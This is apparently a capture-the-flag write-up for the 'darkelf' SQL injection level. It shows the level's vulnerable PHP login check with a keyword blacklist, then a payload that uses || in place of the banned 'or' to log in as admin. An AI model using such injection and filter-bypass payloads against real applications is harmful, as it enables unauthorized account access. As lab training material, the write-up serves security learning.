# darkelf

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

`or` and `and` is banned, HeHe. From the [MySQL Operators Documentation](https://dev.mysql.com/doc/refman/8.0/en/non-typed-operators.html), I can use `||` or `&&` instead.

```
pw=' || id='admin
```

```
query : select id from prob_darkelf where id='guest' and pw='' || id='admin'
Hello admin
DARKELF Clear!
```